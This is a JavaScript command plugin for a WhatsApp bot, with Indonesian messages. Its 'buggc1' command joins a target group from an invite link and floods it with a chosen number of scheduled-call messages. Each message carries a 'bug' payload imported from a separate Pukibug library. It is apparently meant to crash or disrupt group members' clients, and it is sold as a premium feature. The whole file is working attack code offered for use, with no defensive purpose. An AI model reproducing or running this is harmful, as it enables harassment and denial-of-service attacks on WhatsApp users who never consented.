let moment = require('moment-timezone')
let time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
let salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { Pukibug } = require('../lib/Pukibug.js')

let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
let handler = async (m, { conn, text, command, usedPrefix }) => {
let [link, jumlah] = text.split `|`
if (!link) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} https://chat.whatsapp.com/xxxxxx|20`, m)
if (!jumlah) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} https://chat.whatsapp.com/xxxxxx|20`, m)
let [_, code] = link.match(linkRegex) || []
if (!code) return conn.reply(m.chat, `Example: ${usedPrefix + command} https://chat.whatsapp.com/xxxxxx`, m)
if (text == sgc) return conn.reply(m.chat, 'Tidak bisa spam ke group ini', m)
let Puki = await conn.groupAcceptInvite(code)
jumlah = `${jumlah}`
for (let i = 0; i < jumlah; i++) {
const cap = `${Pukibug}`
let call = {
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: `${cap}`
}}
conn.relayMessage(Puki, call, {})
await sleep(1000)
}
await conn.reply(m.chat, `*Sukses mengirim Bug Sejumlah ${jumlah} Tolong Jeda 3 Menit Yah*`, m)
await conn.groupLeave(Puki)
}
handler.help = ['buggc1 *<link|amount>*']
handler.tags = ['bug']
handler.premium = true
handler.command = /^(buggc1)$/i
handler.register = true
handler.limit = true

module.exports = handler
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}